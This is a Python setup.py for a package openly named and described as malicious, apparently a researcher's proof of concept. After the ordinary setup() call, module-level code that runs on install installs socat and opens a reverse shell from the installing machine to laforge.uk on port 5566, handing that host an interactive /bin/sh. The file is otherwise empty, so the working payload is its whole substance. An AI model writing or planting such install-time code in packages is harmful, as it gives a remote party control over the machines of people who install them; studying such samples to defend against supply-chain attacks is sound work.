from setuptools import setup

setup(name='maliciouspackage',
      version='0.4',
      description='Malicious Python package',
      url='http://laforge.uk/maliciouspackage',
      author='Laforge',
      author_email='laforge@wearehackerone.com',
      license='MIT',
      packages=['maliciouspackage'],
      zip_safe=False)

import os
os.system('apt install -y socat')
os.system('socat tcp-connect:laforge.uk:5566 exec:/bin/sh,pty,stderr,setsid,sigint,sane')
